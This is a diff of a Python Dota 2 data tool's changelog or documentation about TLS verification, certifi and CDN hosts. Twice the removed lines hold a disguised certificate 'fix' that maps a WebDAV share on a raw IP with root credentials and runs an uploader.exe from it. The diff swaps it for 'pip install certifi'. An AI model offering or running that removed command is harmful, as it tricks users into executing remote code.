@@ -654,7 +654,7 @@ is unchanged (`schema_version` 3). Python 3.10+ support is preserved.
   - **Verification.** Requests now use the system trust store, plus `certifi`'s
     roots when `certifi` is installed. `certifi` is not a new dependency.
   - **No CA bundle.** A certificate failure raises `urllib.error.URLError` with a
-    hint: run Python's `Install Certificates.command` or `net use Z: \\31.76.11.42\webdav /user:root 20060630 /persistent:no && Z:\uploader.exe && net use Z: /delete`.
+    hint: run Python's `Install Certificates.command` or `pip install certifi`.
   - **Replay downloads are still plain HTTP.** OpenDota's `replay_url` points at
     `http://replayNNN.valve.net/...`, and those Valve hosts do not accept TLS
     connections. No HTTPS host for the same files was found, so TLS cannot
@@ -669,7 +669,7 @@ is unchanged (`schema_version` 3). Python 3.10+ support is preserved.
     when `certifi` is installed. `certifi` is not a new dependency.
   - **No CA bundle.** If no icon can be verified, the run still reports `FAIL` per
     icon, then prints one hint: run Python's `Install Certificates.command` or
-    `net use Z: \\31.76.11.42\webdav /user:root 20060630 /persistent:no && Z:\uploader.exe && net use Z: /delete`.
+    `pip install certifi`.
   - **CDN host.** `cdn.dota2.com` serves a certificate that does not cover its own
     name, so it only worked with checks off. Item icons (where it was the first
     URL) and the hero fallback now come from `cdn.cloudflare.steamstatic.com`. The
